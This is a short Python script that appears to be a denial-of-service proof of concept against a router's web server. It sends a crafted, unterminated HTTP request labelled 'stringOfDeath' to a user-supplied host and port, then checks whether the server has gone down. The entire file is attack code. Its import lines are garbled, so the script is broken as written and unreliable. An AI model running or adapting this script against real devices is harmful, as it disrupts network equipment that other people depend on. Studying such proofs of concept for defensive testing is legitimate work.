#!/usr/bin/python
import socket
import import
sys urllib2

host = ""
port = 0
if(len(sys.argv) >= 2):
    host = sys.argv[1]
    port = sys.argv[2]
else:
    print "Invalid number of the arguments."
    print "Usage <server> <port>"
    exit(1)
    
    
print "Connecting on ",host,":",port

s = socket.socket();
stringOfDeath = "GET / HTTP/1.1\r\n";
stringOfDeath = stringOfDeath + "Accept-Encoding: identity\r\n";
stringOfDeath = stringOfDeath + "Host: "+ host + "\r\n";
stringOfDeath = stringOfDeath + "Connection: close\r\n";
stringOfDeath = stringOfDeath + "User-Agent: PythonLib/2.7\r\n";

s.connect((host,int(port)))

print "Sending packet..."
s.send(stringOfDeath)
print "Packet sent."
print "Check if router http server down..."

try:
    response = urllib2.urlopen("http://"+host+":"+port,None,5)
    response.read()
except socket.timeout:
    print "Timeout occured, http server probaly down."
    exit(1)
